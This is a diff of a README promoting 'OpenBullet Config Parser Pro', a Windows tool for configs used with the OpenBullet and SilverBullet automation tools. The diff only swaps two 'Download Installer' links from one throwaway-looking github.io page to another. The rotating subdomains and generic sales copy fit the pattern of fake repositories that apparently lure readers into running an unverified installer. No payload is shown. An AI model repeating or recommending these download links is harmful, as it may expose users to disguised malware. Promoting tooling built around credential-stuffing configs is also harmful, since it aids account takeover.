@@ -2,7 +2,7 @@
 
 OpenBullet Config Parser Pro is a powerful Windows desktop application designed for parsing, analyzing, and managing configuration files used in security testing and automation workflows. Whether you are working with OpenBullet, SilverBullet, or custom config formats, this tool streamlines your entire configuration management process with an intuitive interface built for 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -62,7 +62,7 @@ A: No. All parsing and processing occurs entirely locally on your Windows machin
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Changelog
 
